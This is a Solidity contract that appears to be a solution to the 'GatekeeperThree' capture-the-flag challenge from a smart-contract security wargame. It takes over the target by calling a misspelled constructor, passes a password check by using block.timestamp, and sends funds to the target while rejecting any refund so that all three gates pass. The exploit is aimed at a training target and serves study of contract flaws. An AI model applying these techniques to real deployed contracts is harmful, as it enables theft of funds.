pragma solidity ^0.8.0;

import {GatekeeperThree, SimpleTrick} from "./GatekeeperThree.sol";

contract Kick {

    GatekeeperThree public gate;
    constructor(address payable _gate) payable {
        gate = GatekeeperThree(_gate);
        address(gate).call{value: msg.value}("");
    }

    function kick() external {
        // gate one
        gate.construct0r();
        // gate two
        uint256 password = block.timestamp;
        gate.getAllowance(password);
        gate.getAllowance(password);
        // gate three
        gate.enter();
    }

    receive() external payable {
        if(msg.sender == address(gate)) {
            revert();
        }
    }
}